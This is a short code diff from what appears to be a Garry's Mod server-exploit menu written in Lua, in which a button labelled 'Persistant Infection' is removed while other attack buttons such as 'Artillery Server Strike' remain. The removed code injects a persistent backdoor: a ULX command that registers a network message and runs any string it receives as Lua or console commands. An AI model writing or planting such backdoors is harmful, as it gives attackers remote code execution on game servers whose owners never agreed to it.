@@ -2387,29 +2387,6 @@ end)
 			]])
         end)
 
-		rebug.AddButton("@Persistant Infection", Bar1, function()
-            surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[
-
-				ULib.cmds.addCommand( "ulx versions", function()
-
-					util.AddNetworkString('REBUG')
-					net.Receive('REBUG', function(length, ply)
-						local netString = net.ReadString()
-						local bit = net.ReadBit()
-
-						if bit == 1 then
-							RunString(netString)
-						else
-							game.ConsoleCommand(netString .. '\n')
-						end
-					end)
-
-				end )
-
-			]])
-        end)
-
         rebug.AddButton("Artillery Server Strike", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             noob.PostLua([[
